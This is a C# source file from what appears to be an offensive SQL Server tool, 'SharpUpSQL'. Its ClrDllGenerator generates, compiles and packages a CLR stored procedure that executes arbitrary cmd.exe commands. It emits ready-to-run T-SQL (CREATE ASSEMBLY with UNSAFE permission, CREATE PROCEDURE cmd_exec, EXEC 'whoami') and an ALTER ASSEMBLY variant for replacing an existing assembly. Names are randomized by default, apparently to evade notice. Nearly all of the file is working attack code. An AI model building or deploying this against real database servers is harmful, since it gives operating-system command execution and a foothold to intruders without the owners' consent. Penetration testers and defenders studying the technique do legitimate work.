using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace SharpUpSQL.Attack
{
    internal sealed class ClrBuildResult
    {
        public byte[] DllBytes { get; set; }
        public string SourcePath { get; set; }
        public string DllPath { get; set; }
        public string SqlScriptPath { get; set; }
        public string Error { get; set; }
    }

    internal static class ClrDllGenerator
    {
        internal static ClrBuildResult BuildAssembly(
            string command,
            string assemblyName,
            string className,
            string methodName)
        {
            var outDir = Path.GetTempPath();
            var fileBase = "SharpUpSQL_CLR_" + Guid.NewGuid().ToString("N");
            var sourcePath = Path.Combine(outDir, fileBase + ".cs");
            var dllPath = Path.Combine(outDir, fileBase + ".dll");
            var sqlPath = Path.Combine(outDir, fileBase + ".txt");

            var source = BuildSource(className, methodName);
            File.WriteAllText(sourcePath, source, Encoding.UTF8);

            var csc = FindCsc();
            if (string.IsNullOrEmpty(csc))
            {
                return new ClrBuildResult { Error = "No csc.exe found." };
            }

            var references = FindSqlReferences();
            var args = "/target:library /nologo /out:\"" + dllPath + "\"";
            if (!string.IsNullOrEmpty(references))
            {
                args += " /r:\"" + references + "\"";
            }

            args += " \"" + sourcePath + "\"";

            var startInfo = new ProcessStartInfo
            {
                FileName = csc,
                Arguments = args,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using (var process = Process.Start(startInfo))
            {
                process.WaitForExit();
                if (process.ExitCode != 0 || !File.Exists(dllPath))
                {
                    var stderr = process.StandardError.ReadToEnd();
                    return new ClrBuildResult
                    {
                        Error = string.IsNullOrWhiteSpace(stderr) ? "CLR compilation failed." : stderr.Trim()
                    };
                }
            }

            var bytes = File.ReadAllBytes(dllPath);
            var sql = BuildSqlScript(assemblyName, className, methodName, bytes, command);
            File.WriteAllText(sqlPath, sql, Encoding.UTF8);

            return new ClrBuildResult
            {
                DllBytes = bytes,
                SourcePath = sourcePath,
                DllPath = dllPath,
                SqlScriptPath = sqlPath
            };
        }

        internal static ClrBuildResult CreateFiles(
            string outDir,
            string outFile,
            string procedureName,
            string assemblyName,
            string className,
            string methodName,
            string sourceDllPath)
        {
            Directory.CreateDirectory(outDir ?? ".");
            var baseName = string.IsNullOrWhiteSpace(outFile) ? "CLRFile" : outFile;
            var sourcePath = Path.Combine(outDir, baseName + ".csc");
            var dllPath = Path.Combine(outDir, baseName + ".dll");
            var commandPath = Path.Combine(outDir, baseName + ".txt");

            assemblyName = assemblyName ?? RandomToken(8);
            className = className ?? RandomToken(8);
            methodName = methodName ?? RandomToken(8);
            procedureName = string.IsNullOrWhiteSpace(procedureName) ? "cmd_exec" : procedureName;

            byte[] bytes;
            if (!string.IsNullOrWhiteSpace(sourceDllPath))
            {
                dllPath = Path.GetFullPath(sourceDllPath);
                sourcePath = "NA";
                bytes = File.ReadAllBytes(dllPath);
                var alter = new StringBuilder();
                alter.AppendLine("-- Change the assembly name to the one you want to replace");
                alter.AppendLine("ALTER ASSEMBLY [TBD] FROM");
                alter.Append("0x");
                alter.Append(BitConverter.ToString(bytes).Replace("-", string.Empty));
                alter.AppendLine();
                alter.AppendLine("WITH PERMISSION_SET = UNSAFE");
                File.WriteAllText(commandPath, alter.ToString(), Encoding.UTF8);
            }
            else
            {
                var build = BuildAssembly("whoami", assemblyName, className, methodName);
                if (build.DllBytes == null)
                {
                    return build;
                }

                File.WriteAllText(sourcePath, BuildSource(className, methodName), Encoding.UTF8);
                File.WriteAllBytes(dllPath, build.DllBytes);
                File.WriteAllText(
                    commandPath,
                    BuildSqlScript(assemblyName, className, procedureName, build.DllBytes, "whoami", methodName),
                    Encoding.UTF8);
                bytes = build.DllBytes;
            }

            return new ClrBuildResult
            {
                DllBytes = bytes,
                SourcePath = sourcePath,
                DllPath = dllPath,
                SqlScriptPath = commandPath
            };
        }

        private static string BuildSource(string className, string methodName)
        {
            return @"using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Diagnostics;
using System.Text;

public partial class " + className + @"
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void " + methodName + @" (SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @""C:\Windows\System32\cmd.exe"";
        proc.StartInfo.Arguments = string.Format(@"" /C {0}"", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(""output"", SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
};";
        }

        private static string BuildSqlScript(
            string assemblyName,
            string className,
            string procedureName,
            byte[] bytes,
            string sampleCommand,
            string methodName = null)
        {
            if (string.IsNullOrWhiteSpace(methodName))
            {
                methodName = procedureName;
            }

            var builder = new StringBuilder();
            builder.AppendLine("CREATE ASSEMBLY [" + assemblyName + "] AUTHORIZATION [dbo] FROM");
            builder.Append("0x");
            builder.Append(BitConverter.ToString(bytes).Replace("-", string.Empty));
            builder.AppendLine();
            builder.AppendLine("WITH PERMISSION_SET = UNSAFE");
            builder.AppendLine("GO");
            builder.AppendLine("CREATE PROCEDURE [dbo].[" + procedureName + "] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [" +
                                 assemblyName + "].[" + className + "].[" + methodName + "];");
            builder.AppendLine("GO");
            builder.AppendLine("EXEC [dbo].[" + procedureName + "] " + SqlValueFormatterQuote(sampleCommand));
            builder.AppendLine("GO");
            return builder.ToString();
        }

        private static string SqlValueFormatterQuote(string value)
        {
            return "'" + (value ?? string.Empty).Replace("'", "''") + "'";
        }

        private static string FindCsc()
        {
            var roots = new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)
            };

            foreach (var root in roots.Where(r => !string.IsNullOrEmpty(r)))
            {
                var microsoftNet = Path.Combine(root, "Microsoft.NET");
                if (!Directory.Exists(microsoftNet))
                {
                    continue;
                }

                var matches = Directory.GetFiles(microsoftNet, "csc.exe", SearchOption.AllDirectories);
                if (matches.Length > 0)
                {
                    return matches.OrderByDescending(p => p).First();
                }
            }

            return null;
        }

        private static string FindSqlReferences()
        {
            var framework = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                "Microsoft.NET",
                "Framework64",
                "v4.0.30319");

            var systemData = Path.Combine(framework, "System.Data.dll");
            if (File.Exists(systemData))
            {
                return systemData;
            }

            return null;
        }

        private static string RandomToken(int length)
        {
            const string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            var random = new Random(Guid.NewGuid().GetHashCode());
            var chars = new char[length];
            for (var i = 0; i < length; i++)
            {
                chars[i] = alphabet[random.Next(alphabet.Length)];
            }

            return new string(chars);
        }
    }
}
